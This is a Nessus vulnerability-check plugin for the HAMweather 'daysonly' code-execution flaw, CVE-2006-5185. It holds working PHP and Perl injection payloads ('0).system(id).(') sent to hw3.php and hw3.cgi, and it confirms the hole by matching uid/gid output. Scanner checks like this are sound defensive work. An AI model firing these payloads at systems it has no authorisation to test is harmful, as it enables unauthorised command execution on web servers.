#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22497);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-5185");
  script_bugtraq_id(20311);
  script_osvdb_id(29464);

  script_name(english:"HAMweather Template.php do_parse_code Function Arbitrary Code Execution");
  script_summary(english:"Executes arbitrary command via HAMweather");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that allows execution of
arbitrary code." );
 script_set_attribute(attribute:"description", value:
"The remote host is running HAMweather, a weather-forecasting software
application. 

The installed version of HAMweather fails to properly sanitize input
to the 'daysonly' parameter before using it to evaluate PHP or Perl
code.  An unauthenticated attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00115-09302006" );
 script_set_attribute(attribute:"see_also", value:"http://support.hamweather.com/viewtopic.php?t=6548" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to HAMweather 3.9.8.2 Perl/ASP or HAMweather 3.9.8.5 PHP or
later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/10/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/30");
 script_cvs_date("$Date: 2011/03/15 19:22:14 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

# Loop through directories.
if (thorough_tests) extra_dirs = make_list("/weather", "/hw3");
else extra_dirs = make_list();

# Try to exploit the flaw to run a command.
cmd = "id";
# - PHP variant.
http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : string("/hw3.php?daysonly=0).system(", cmd, ").("),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  port          : port
);
# - PERL variant.
http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : string("/hw3.cgi?daysonly=0).system('", cmd, "').("),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  port          : port
);
# - ASP variant (to be determined).
